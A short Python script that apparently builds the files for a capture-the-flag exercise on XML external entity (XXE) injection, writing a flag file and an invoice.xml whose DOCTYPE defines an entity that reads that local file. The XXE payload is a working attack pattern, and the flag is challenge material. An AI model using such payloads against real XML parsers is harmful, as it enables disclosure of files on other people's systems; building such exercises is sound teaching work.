#!/usr/bin/env python3
"""Producer for xxe-local artifacts (secret.flag + invoice.xml)."""

FLAG = "NCTF{external_entity_reads_the_local_secret_file}"

INVOICE = """<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "secret.flag">
]>
<invoice>
  <customer>Adjoa Enterprises</customer>
  <note>&xxe;</note>
</invoice>
"""


def main() -> None:
    with open("secret.flag", "w") as f:
        f.write(FLAG)
    with open("invoice.xml", "w") as f:
        f.write(INVOICE)


if __name__ == "__main__":
    main()
